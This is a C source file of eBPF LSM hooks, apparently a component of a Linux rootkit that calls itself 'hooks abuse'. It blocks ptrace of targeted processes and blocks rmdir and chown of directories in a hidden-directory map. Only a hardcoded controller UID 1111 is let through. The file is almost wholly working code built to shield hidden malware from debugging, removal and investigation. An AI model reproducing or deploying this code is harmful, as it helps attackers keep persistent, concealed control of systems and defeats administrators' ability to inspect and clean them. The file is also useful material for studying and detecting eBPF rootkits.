/**
 * This module contains base LSM Ebpg hooks abuse.
 * 
 * Note, i'm basing my ownership based on a custom UID for policy & simple poc testing but consider using more advanced techniques.
 * 
 * Since most of hooks are a bit tricky to play with due the sandboxed environnment. LSM should be a great way to block certains actions on a targetted system.
 * 
 * @ref => https://github.com/torvalds/linux/blob/master/include/linux/lsm_hook_defs.h
 */

#ifndef MOD_LSM_H
#define MOD_LSM_H

#include "../includes/bpf_config.h"
#include "../includes/bpf_common.h"
#include "../includes/bpf_structs.h"
#include "../includes/bpf_debug.h"
#include "../includes/bpf_events_handler.h"
#include "../data/bpf_events.h"
#include "../data/bpf_ringbuf.h"

#ifndef EPERM
#define EPERM 1
#endif

//FOR THE dev_user (control policy)
#define ADM_UID 1111

/**
 * Check is the caller as the valid ADM_UID uid.
 */
static int __is_adm_caller(void)
{
    u64 uid_gid = bpf_get_current_uid_gid();
    u32 uid = uid_gid & 0xFFFFFFFF;
    
    return uid == ADM_UID;
}

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  PTRACE
// └────────────────────────────────────┘
//----------------------------------------------------

/**
 * Utility blocking policy
 * @params => caller & callee pid's
 */
static __always_inline int ptrace_block_policy(pid_t target_candidate_pid, pid_t caller_pid)
{
    if (__is_target_process(target_candidate_pid) && !__is_adm_caller()) {
        char event_str[128] = {0};
        BPF_SNPRINTF(event_str, sizeof(event_str), "blocked caller %d, for pid => %d", caller_pid, target_candidate_pid);

        send_event(EVENT_TRIGGERED, "ls_ptrace_access_check", event_str);
        return -EPERM;
    }

    return 0;
}

/**
 * Handling ptrace access check hook.
 */
SEC("lsm/ptrace_access_check")
int BPF_PROG(handle_ptrace_check, struct task_struct *child, __u32 mode)
{
    struct task_struct *tsk = bpf_get_current_task_btf();
    if (!tsk) 
        return 0;

    // target = child (who wants to be traced), caller = current (tracer)
    return ptrace_block_policy(child->pid, tsk->pid);
}

/**
 * Handling ptrace traceme hook.
 */
SEC("lsm/ptrace_traceme")
int BPF_PROG(handle_ptrace_traceme, struct task_struct *parent)
{
    struct task_struct *tsk = bpf_get_current_task_btf();
    if (!tsk) 
        return 0;

    // target = current (whom expose TRACEME), caller = parent
    return ptrace_block_policy(tsk->pid, parent->pid);
}

//------------------------------------------------------------------------------------------------------------------------

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  PATH
// └────────────────────────────────────┘
//----------------------------------------------------


/**
 * LSM hook called before a directory is removed (rmdir). 
 * It receives two things: dir is the parent directory (dentry + mount), and dentry is the directory being deleted. 
 * The parent comes as a full struct path because a bare dentry has no mount info, which path-based LSMs need to build an absolute path. 
 * The child comes as a bare dentry, and its name is read from dentry->d_name.name (last component only). 
 * @claude.
 * 
 * https://elixir.bootlin.com/linux/v6.18.6/source/include/linux/dcache.h#L92
 */
SEC("lsm/path_rmdir")
int BPF_PROG(handle_rmdir, const struct path *dir, struct dentry *dentry)
{
    if(!dir || !dentry)
        return 0;

    // struct qstr {
    //     union {
    //         struct {
    //             HASH_LEN_DECLARE;
    //         };
    //         u64 hash_len;
    //     };
    // const unsigned char *name;
    // };
    const unsigned char *child_path = BPF_CORE_READ(dentry, d_name.name);
    if(!child_path)
        return 0;

    /**
     * Extract folder name.
     */

    char buf[MAX_PATH] = {0};
    if (bpf_probe_read_kernel_str(buf, sizeof(buf), child_path) < 0)
        return 0;

    char *name = __extract_dname_from_path(buf, sizeof(buf));
    if (!name)
        return 0;

    PRINT_DEBUG("Extract name from rmdir command : %s", name);

    __u8 *flag = bpf_map_lookup_elem(&hide_cache_dir, name);
    if(!flag || *flag != 1)
        return 0;

    PRINT_DEBUG("Found occurence in hide_cache_dir for %s", name);

    //is stored.
    if(!__is_adm_caller()){
        send_event(EVENT_TRIGGERED, "lsm_handle_rmdir", "blocked rmdir attempt");
        return -EPERM;
    }

    return 0;
}

/**
 * https://github.com/torvalds/linux/blob/master/include/linux/lsm_hook_defs.h
 * LSM_HOOK(int, 0, path_chown, const struct path *path, kuid_t uid, kgid_t gid)
 */
SEC("lsm/path_chown")
int handle_chown(unsigned long long *ctx)
{
    //handling ctx & args.
    const struct path *path = (const struct path *)ctx[0];
    kuid_t uid;
    kgid_t gid;

    __builtin_memcpy(&uid, &ctx[1], sizeof(uid));
    __builtin_memcpy(&gid, &ctx[2], sizeof(gid));

    //handling path.
    const unsigned char *target_path = BPF_CORE_READ(path, dentry->d_name.name);
    if(!target_path){
        PRINT_DEBUG("Error extracting path.");
        return 0;
    }

    /**
     * Maybe handling chown on certains files ?
     * TO DO ? creating dedicated function based on a char *name checking in both hide dir & hide file
     * 
     * For now handling directories.
     */
    char buf[MAX_PATH] = {0};
    if (bpf_probe_read_kernel_str(buf, sizeof(buf), target_path) < 0)
        return 0;

    char *name = __extract_dname_from_path(buf, sizeof(buf));
    if (!name)
        return 0;

    __u8 *flag = bpf_map_lookup_elem(&hide_cache_dir, name);
    if(!flag || *flag != 1)
        return 0;

    //is stored.
    if(!__is_adm_caller()){
        send_event(EVENT_TRIGGERED, "lsm_handle_chown", "blocked chown attempt.");
        return -EPERM;
    }

    return 0;
}

//------------------------------------------------------------------------------------------------------------------------

//----------------------------------------------------
// ┌────────────────────────────────────┐
//  NETWORK
// └────────────────────────────────────┘
//----------------------------------------------------
//TO DO.

#endif